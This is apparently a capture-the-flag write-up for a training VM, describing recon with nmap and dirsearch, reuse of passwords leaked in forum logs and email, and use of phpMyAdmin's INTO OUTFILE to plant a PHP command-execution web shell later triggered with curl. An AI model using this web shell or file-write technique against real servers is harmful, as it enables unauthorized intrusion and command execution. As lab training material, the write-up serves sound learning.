first we will use nmap to get the ip of the VM, and scan it's open ports.

![nmap](./nmap.png)

we can see multiple ports open, including a http server. opening the web page we are greeted by a simple useless static html page. instead we will use a tool (dirsearch here) to find http path based on a wordlist.

![dirsearch](./dirsearch.png)

we see there is a forum, a webmail, and a phpmyadmin.

let's see the forum.

there is only 4 posts. the only interesting is `Probleme login ? - lmezard` where he posted the log of his failed login.

scrolling through the logs, we can see at a point he mistakenly entered his password in the username field, which is not hidden: ` Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`

we can try to connect to the multiples services, but the only that work is on the forum itself as the user `lmezard` with the password `!q\]Ej?*5K5cy*AJ`.

now we can access the account private informations, including it's email `laurie@borntosec.net` that we can use to connect to the webmail.

we can see a mail saying

> Hey Laurie,
>
> You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
>
> Best regards.

well now we can connect to the phpmyadmin instance, it's very useful as we can use it to write sql query, and mysql is able to write to a file using `INTO OUTFILE` command.

trying to write a simple command launcher into the http server directory `SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/backdoor.php"` fails. we need to find a location where we have write access.

maybe with the forum ? looking at the forum source code (mylittleforum) there is multiples directory, trying multiples we find `templates_c` where we can write the file.

so now we just have to access it: `curl --insecure https://vm/forum/templates_c/backdoor.php?cmd=whoami` and we are www-data as expected.

trying to find something, we can `ls` the `/home` dir and get `LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz`

the only dir we can access is `LOOKATME`, where there a single `password` file with `lmezard:G!@M6f4Eatau{sF"` inside.

ssh don't work, but ftp does.
